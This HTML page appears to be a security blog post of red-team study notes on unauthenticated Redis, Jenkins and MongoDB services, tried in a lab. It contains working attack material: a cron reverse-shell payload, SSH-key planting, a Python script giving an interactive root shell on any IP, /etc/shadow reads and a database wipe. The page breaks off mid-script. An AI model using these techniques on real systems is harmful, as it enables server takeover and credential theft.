@@ -1,0 +1,1653 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="未授权漏洞, F1veseven Blog">
+    <meta name="description" content="这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞。文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。
+0x01 RedisRedis是一个开源的使用ANSI C语言编写、支持网络、可基于">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>未授权漏洞 | F1veseven Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+    <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?70ac410d7f7c0aefe8cf937e1050b8d4";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">F1veseven Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">F1veseven Blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://imgtp.apqiang.com/2022/04/01/cGCMlWr6.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">未授权漏洞</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/redteam/">
+                                <span class="chip bg-color">redteam</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%A4%96%E9%83%A8%E6%89%93%E7%82%B9/">
+                                <span class="chip bg-color">外部打点</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/">
+                                <span class="chip bg-color">未授权</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/redteam/" class="post-category">
+                                redteam
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-31
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    8 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞。<br>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p>
+<h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库</p>
+<h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *
+<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://imgtp.apqiang.com/2022/03/31/ViB5WSTA.png"></p>
+<h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulhub/redis/4-unacc<span class="token punctuation">]</span>
+└─$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span> 
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *
+<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET <span class="token function">dir</span>
+
+<span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"dir"</span>
+<span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"/data"</span>
+   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /tmp/
+   OK
+   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> SET foobar <span class="token string">"who are you? f1ve"</span>
+   OK
+   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET dbfilename
+<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"dbfilename"</span>
+<span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"dump.rdb"</span>
+   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename write_file.log
+   OK
+   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save
+   OK
+   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://imgtp.apqiang.com/2022/03/31/EYuIQHos.png"></p>
+<h3 id="反弹shell-Linux"><a href="#反弹shell-Linux" class="headerlink" title="反弹shell-Linux"></a>反弹shell-Linux</h3><p>在redis以root权限运行</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.186.26/4444 0>&amp;1<span class="token entity" title="\n">\n</span>"</span>
+OK
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron
+OK
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename root
+OK
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#获取rsa</span>
+$ ssh-keygen -t rsa
+
+<span class="token comment">#将公钥写入foo.txt，注意内容前后要加2个换行</span>
+<span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> foo.txt
+
+<span class="token comment">#将foo.txt放入键crackit里</span>
+<span class="token function">cat</span> foo.txt <span class="token operator">|</span> redis-cli -h IP -x <span class="token builtin class-name">set</span> crackit
+
+<span class="token comment">#连接目标</span>
+redis-cli -h IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://imgtp.apqiang.com/2022/03/31/to7ybOWZ.png"></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#设置目标的redis的配置文件</span>
+<span class="token comment">#设置数据库备份目录为/root/.ssh/</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /root/.ssh/
+OK
+<span class="token comment">#设置数据库备份文件名为authorized_keys</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> dbfilename <span class="token string">"authorized_keys"</span>
+OK
+<span class="token comment">#此时公钥成功写入目标机，文件名为authorized_keys</span>
+<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save
+OK
+
+<span class="token comment">#利用私钥连接目标</span>
+<span class="token function">ssh</span> -i /root/.ssh/id_rsa root@127.0.0.1
+
+<span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>脚本检测：</p>
+<p>可以自动化执行上述写入公钥步骤，并且执行 id 命令</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span>
+<span class="token comment">#redis未授权交互式检测脚本</span>
+<span class="token comment">#commands: python3 redis_shell.py ip</span>
+
+<span class="token keyword">import</span> redis
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> paramiko
+
+rsa_pub <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa.pub'</span>	<span class="token comment"># 公钥路径</span>
+pkey <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa'</span>	<span class="token comment">#密钥路径</span>
+
+<span class="token comment"># 获取公钥内容</span>
+<span class="token keyword">def</span> <span class="token function">get_id_rsa_pub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>rsa_pub<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    id_rsa_pub <span class="token operator">=</span> <span class="token string">'\n\n\n&#123;&#125;\n\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> id_rsa_pub
+  
+<span class="token keyword">def</span> <span class="token function">shell_redis</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">try</span><span class="token punctuation">:</span>
+    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> socket_timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh/'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dir /root/.ssh/'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dbfilename "authorized_keys"'</span><span class="token punctuation">)</span>
+    id_rsa_pub <span class="token operator">=</span> get_id_rsa_pub<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'crackit'</span><span class="token punctuation">,</span> id_rsa_pub<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : set crackit'</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : save'</span><span class="token punctuation">)</span>
+    key <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span>pkey<span class="token punctuation">)</span>
+    ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>key<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+    ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>
+    content <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> content<span class="token punctuation">:</span>
+      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ok] connect to &#123;&#125; : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+      command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; >>> '</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+      ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
+      contents <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+      <span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+  <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args
+    <span class="token keyword">if</span> error <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+      error <span class="token operator">=</span> <span class="token string">'save error'</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+  ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+  shell_redis<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://imgtp.apqiang.com/2022/04/01/UTbAUG0g.png"></p>
+<h3 id="清空数据库"><a href="#清空数据库" class="headerlink" title="清空数据库"></a>清空数据库</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> FLUSHALL
+OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>安装配置可参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11487797.html">https://www.cnblogs.com/-mo-/p/11487797.html</a></p>
+<h2 id="0x02-Jenkins"><a href="#0x02-Jenkins" class="headerlink" title="0x02 Jenkins"></a>0x02 Jenkins</h2><p>默认是8080端口 未授权访问就是任意用户都能访问 都能执行命令</p>
+<p>127.0.0.1:8080/jenkins/manage</p>
+<p>127.0.0.1:8080/jenkins/script</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">#命令集合
+println <span class="token string">"whoami"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+
+#<span class="token class-name">Linux</span>
+println <span class="token string">"ifconfig -a"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+println <span class="token string">"cat /etc/passwd"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+println <span class="token string">"cat /etc/shadow"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+
+#<span class="token class-name">Windows</span>
+println <span class="token string">"ipconfig /all"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+def sout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> serr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+def proc <span class="token operator">=</span> 'ipconfig'<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+proc<span class="token punctuation">.</span><span class="token function">consumeProcessOutput</span><span class="token punctuation">(</span>sout<span class="token punctuation">,</span> serr<span class="token punctuation">)</span>
+proc<span class="token punctuation">.</span><span class="token function">waitForOrKill</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>
+println <span class="token string">"out> $sout err>$serr"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/6gYytwSB.png"></p>
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/e6Gv868S.png"></p>
+<p>也可以添加Terminal Plugin插件</p>
+<h2 id="0x03-MongoDB"><a href="#0x03-MongoDB" class="headerlink" title="0x03 MongoDB"></a>0x03 MongoDB</h2><p>默认端口：27017</p>
+<p>脚本检测</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span>
+<span class="token comment"># mongodb未授权检测脚本</span>
+<span class="token comment"># usage: python3 mongodb_unauth.py ip port</span>
+<span class="token comment"># 默认端口 28017 和 27017</span>
+
+<span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClient
+<span class="token keyword">import</span> sys
+
+ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">try</span><span class="token punctuation">:</span>
+	conn <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> socketTimeoutMS<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>	<span class="token comment">#连接MongoDB,延时5秒</span>
+	dbs <span class="token operator">=</span> conn<span class="token punctuation">.</span>database_names<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; database_names : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> dbs<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+	error <span class="token operator">=</span> e<span class="token punctuation">.</span>args
